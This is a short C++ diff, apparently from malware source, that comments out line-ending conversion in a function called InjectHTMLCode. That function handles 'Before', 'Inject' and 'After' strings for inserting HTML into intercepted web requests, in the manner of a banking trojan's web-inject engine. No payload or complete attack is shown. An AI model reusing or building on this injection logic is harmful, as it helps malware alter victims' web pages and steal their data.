@@ -927,13 +927,13 @@ bool InjectHTMLCode(PRequest Request, THTMLInject *Inject)
 			// Перед инжектом проверем не является ли строка
 			// строкой в линукс формате
 
-			bool IsLinuxStr = STR::IsLinuxStr((PCHAR)Request->Buffer);
-			if (IsLinuxStr)
-			{
-				Data.Before.ConvertToLinuxFormat();
-				Data.Inject.ConvertToLinuxFormat();
-				Data.After.ConvertToLinuxFormat();
-			}
+//			bool IsLinuxStr = STR::IsLinuxStr((PCHAR)Request->Buffer);
+//			if (IsLinuxStr)
+//			{
+//				Data.Before.ConvertToLinuxFormat();
+//				Data.Inject.ConvertToLinuxFormat();
+//				Data.After.ConvertToLinuxFormat();
+//			}
 
 			PCHAR Before = Data.Before.t_str();
 			PCHAR Inject = Data.Inject.t_str();
